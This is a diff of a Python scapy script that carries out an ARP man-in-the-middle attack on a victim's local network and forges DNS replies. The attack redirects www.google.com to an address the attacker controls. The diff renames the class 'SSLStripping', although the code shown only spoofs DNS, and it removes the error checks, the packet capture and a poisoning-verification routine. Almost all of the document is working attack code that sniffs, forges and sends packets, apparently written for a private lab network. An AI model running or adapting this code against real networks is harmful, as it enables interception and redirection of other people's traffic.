@@ -1,24 +1,13 @@
 # Packages
 import scapy.all as scapy
 import sys, time, multiprocessing
-import netifaces as ni
-
 
 # Constants
 DIVIDER = '=' * 60
 POISON_BREAK = 30
-SPOOF_DOMAIN_NAME = 'www.google.com'
-REDIRECT_IP = '192.168.56.102'
-
-# DNS Spoofing targets
-dns_hosts = {
-    b"www.google.com.": "10.0.2.6",
-    b"google.com.": "10.0.2.6",
-    b"facebook.com.": "10.0.2.6"
-}
 
 # ARP Man in the Middle DNS Spoofing Attack
-class ARPMITMDNSSpoofing():
+class SSLStripping():
     # Constructs the ARP Man in the Middle DNS Spoofing Attack
     def __init__(self, victimIP, interface):
         # Assign default scapy interface
@@ -31,13 +20,7 @@ class ARPMITMDNSSpoofing():
 
         # Assign macAddresses
         self.victimMac = scapy.getmacbyip(victimIP)
-        if not self.victimMac: # If victim MAC not found
-            raise ValueError("Cannot find MAC address for victim IP: {}".format(victimIP))
-
         self.routerMac = scapy.getmacbyip(self.routerIP)
-        if not self.routerMac: # If router MAC not found
-            raise ValueError("Cannot find MAC address for router IP: {}".format(self.routerIP))
-
         self.deviceMac = scapy.get_if_hwaddr(interface)
 
     # Returns interactive prompt string
@@ -91,40 +74,37 @@ class ARPMITMDNSSpoofing():
 
     # Sniffs incoming packets
     def sniffIncomingPackets(self):
-        bpfFilter = 'ip host {}'.format(self.victimIP) 
-        incomingPackets = scapy.sniff(filter = bpfFilter, prn = self.dnsSpoof)
-        #storing all packets in a pcap file
-        scapy.wrpcap('captured_packets.pcap', incomingPackets)
+        incomingPackets = scapy.sniff(prn = self.dnsSpoof)
 
-    # DNS spoof packets
     # DNS spoof packets
     def dnsSpoof(self, packet):
-        if packet.haslayer(scapy.IP) and packet.haslayer(scapy.DNSQR):
-            source_dest = packet[scapy.IP].src
-            if source_dest == self.victimIP and packet[scapy.DNSQR].qname in dns_hosts:
-                if packet.haslayer(scapy.DNS):
-                    # Construct a new packet
-                    new_packet = scapy.Ether(src=packet[scapy.Ether].dst, dst=packet[scapy.Ether].src) / \
-                                scapy.IP(dst=packet[scapy.IP].src, src=packet[scapy.IP].dst) / \
-                                scapy.UDP(dport=packet[scapy.UDP].sport, sport=packet[scapy.UDP].dport) / \
-                                scapy.DNS(id=packet[scapy.DNS].id, qd=packet[scapy.DNS].qd, aa=1, qr=1,
-                                        an=scapy.DNSRR(rrname=packet[scapy.DNS].qd.qname, type='A', ttl=624,
-                                                        rdata=dns_hosts[packet[scapy.DNSQR].qname]))
+        if (packet.haslayer(scapy.DNS)):
+            # Retrieve packet info        
+            packetDNSLayer = packet.getlayer(scapy.DNS)
+            isRightDomain = packetDNSLayer.qd.qname == 'www.google.com.'
+            # isDNSRequest = packetDNSLayer.qr == 0
 
-                    scapy.sendp(new_packet, iface=self.interface)
-                    print("DNS packet was sent with: " + new_packet.summary() + " to ip: " + new_packet[scapy.IP].dst)
-                else:
-                    if packet.haslayer(scapy.IP):
-                        del packet[scapy.IP].len
-                        del packet[scapy.IP].chksum
+            if isRightDomain:
+                # Original packet layers
+                packetIPLayer = packet.getlayer(scapy.IP)
+                packetUDPLayer = packet.getlayer(scapy.UDP)
+                
+                # Spoofed packet layers
+                spoofedIPLayer = scapy.IP(dst = packetIPLayer.src,
+                                src = packetIPLayer.dst) # Reverse IP sending direction
+                spoofedUDPLayer = scapy.UDP(dport = packetUDPLayer.sport,
+                                sport = packetUDPLayer.dport) # Reverse UDP sending direction
+                spoofedDNSLayer = scapy.DNS(id = packetDNSLayer.id,
+                                qr = 1,
+                                aa = 1,
+                                qd = packetDNSLayer.qd,
+                                an = scapy.DNSRR(rrname = 'www.google.com.',
+                                                ttl = 10,
+                                                rdata = '10.0.2.5'))
 
-                    if packet.haslayer(scapy.UDP):
-                        del packet[scapy.UDP].len
-                        del packet[scapy.UDP].chksum
+                packet = spoofedIPLayer/spoofedUDPLayer/spoofedDNSLayer # Assemble and assign spoofed packet
 
-                    scapy.send(packet)
-
-
+                scapy.send(packet)
 
     # Clean ARP tables of the victims
     def clean(self):
@@ -142,19 +122,6 @@ class ARPMITMDNSSpoofing():
             hwsrc=self.victimMac,
             pdst=self.routerIP,
             hwdst="ff:ff:ff:ff:ff:ff"), count=5)
-    #check if the posioning was sucessful
-    def check_arp_poisoning(self):
-        # Send an ICMP echo request (ping) to the victim
-        icmp = scapy.IP(dst=self.victimIP)/scapy.ICMP()
-        response = scapy.sr1(icmp, timeout=2, verbose=0)
-
-        if response is not None and response.src == self.victimIP and response[scapy.ICMP].type == 0:
-            # We received an ICMP echo reply from the victim
-            print("ARP poisoning appears to be successful")
-        else:
-            # We didn't receive a reply, or the reply wasn't what we expected
-            print("ARP poisoning may not have been successful")
-
 
 # Starts the program
 if __name__ == '__main__':
@@ -166,7 +133,7 @@ if __name__ == '__main__':
     interface = sys.argv[2]
 
     # Initialize Attack
-    attack = ARPMITMDNSSpoofing(victimIP, interface)
+    attack = SSLStripping(victimIP, interface)
 
     # Execute attack
     attack.execute()
